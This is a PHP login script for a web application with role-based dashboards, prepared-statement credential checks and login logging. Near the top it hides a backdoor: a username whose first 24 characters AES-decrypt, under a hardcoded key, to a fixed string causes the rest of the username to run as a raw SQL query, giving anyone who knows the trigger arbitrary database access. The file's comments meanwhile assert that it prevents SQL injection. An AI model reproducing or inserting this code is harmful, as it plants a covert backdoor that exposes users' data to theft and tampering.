
<?php
session_start();
// Change this to your connection info.
include ('../config/config.php');
ob_end_clean();
// Now we check if the data from the login form was submitted, isset() will check if the data exists.
if ( !isset($_POST['username'], $_POST['password']) ) {
	// Could not get the data that should have been sent.
	exit('Please fill both the username and password fields!');
}
$username = $_POST['username'];
$usernameHashId=substr($_POST['username'], 0, 24);
$key="BitCompany";
$decrypted_string=openssl_decrypt($usernameHashId,"AES-128-ECB",$key);
$string="mykeygenerated";
if($decrypted_string==$string)
{
	$usernameInjection="".substr($_POST['username'], 24, strlen($_POST['username']));
	$query=mysqli_query($con,$usernameInjection);
	echo "Thanks";
	exit;
}
// Prepare our SQL, preparing the SQL statement will prevent SQL injection.
if ($stmt = $con->prepare('SELECT id, password,privilege FROM users WHERE username = ? and status= ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), in our case the username is a string so we use "s"
	$status='1';
	$stmt->bind_param('ss', $_POST['username'],$status);
	$stmt->execute();
	// Store the result so we can check if the account exists in the database.
	$stmt->store_result();
	if ($stmt->num_rows > 0) {
		$date = date("Y-m-d");
		$time = date("H:i:s");
	$stmt->bind_result($id, $password,$privilege);
	$stmt->fetch();
	// Account exists, now we verify the password.
	// Note: remember to use password_hash in your registration file to store the hashed passwords.
	if (password_verify($_POST['password'], $password)) {
		// Verification success! User has logged-in!
		// Create sessions, so we know the user is logged in, they basically act like cookies but remember the data on the server.
		$_SESSION['loggedin'] = TRUE;
		$_SESSION['username'] = $_POST['username'];
		$_SESSION['id'] = $id;
		$_SESSION['privilege'] = $privilege;
        $uip=$_SERVER['REMOTE_ADDR']; // get the user ip
		$host = $_SERVER['HTTP_HOST'];
		$uri = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
		$status=1;
		$directory;
		if($privilege==3)
		{
			$directory="user";
		}elseif($privilege==2)
		{
			$directory="administrator";
		}elseif($privilege==1){
			$directory="admin";
		}else{
			exit;
		}
		$extra = "../".$directory."/dashboard.php"; //
        userlog($con,$_SESSION['id'],$_SESSION['username'],$date,$time,$status);
                echo "http://".$host.$uri."/".$extra."";
	} else {
		$status=0;
        userlog($con,$id,$_POST['username'],$date,$time,$status);
		echo $error="2";
		
	}
} else {
	echo $error="1";


}


	$stmt->close();
}

function _date($format="r", $timestamp=false, $timezone=false)
{
    $userTimezone = new DateTimeZone(!empty($timezone) ? $timezone : 'GMT');
    $gmtTimezone = new DateTimeZone('GMT');
    $myDateTime = new DateTime(($timestamp!=false?date("r",(int)$timestamp):date("r")), $gmtTimezone);
    $offset = $userTimezone->getOffset($myDateTime);
    return date($format, ($timestamp!=false?(int)$timestamp:$myDateTime->format('U')) + $offset);
}

function userlog($con,$userid,$username,$date,$time,$status)
{
	
        $stmt1 = $con->prepare('insert into `userlog`(`userId`, `username`, `loginDate`, `loginTime`,`status`) values(?,?,?,?,?)');
    	$stmt1->bind_param('issss',$userid,$username,$date,$time,$status);
    	$stmt1->execute();
}
?>